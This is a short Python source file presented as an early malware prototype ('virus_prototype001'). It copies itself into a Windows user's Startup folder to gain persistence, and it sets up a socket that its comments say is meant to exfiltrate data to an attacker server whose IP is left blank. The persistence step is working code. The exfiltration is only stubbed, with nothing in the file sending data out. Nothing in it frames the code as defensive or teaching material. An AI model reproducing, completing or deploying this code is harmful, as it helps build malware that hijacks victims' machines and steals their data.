
# v0.1.0 virus_prototype001
# by blackbeltedman
#***************************import modules***************************#
try:
    import os           #allows for direct shell interface with the os
    import socket       #allows for network connection for data exfiltration
except:
    exit()

#***********************define global variables**********************#

startLocation = os.path.dirname(os.path.abspath(__file__))
filename = os.path.basename(__file__)
ranOnStartupPath = '\"C:\\Users\\NMACKEY1979\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"'
#exfilServerIP = #<SERVER HOST IP HERE>#
port = 80
try:
    exfilSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except:
    exit()

#***********************define alias functions***********************#

def mkdir(directoryName):
    tempDirName = str(directoryName)
    os.system('mkdir ' + tempDirName)

def move(currentPath, destinationPath):
    tempCurrPath = str(currentPath)
    tempDestPath = str(destinationPath)
    os.system('move /Y ' + tempCurrPath + ' ' + tempDestPath)

def copy(currentPath, destinationPath):
    tempCurrPath = str(currentPath)
    tempDestPath = str(destinationPath)
    os.system('copy /Y ' + tempCurrPath + ' ' + tempDestPath)

#**************establish persistence in startup folder***************#

copy(startLocation + '\\' + filename, ranOnStartupPath)
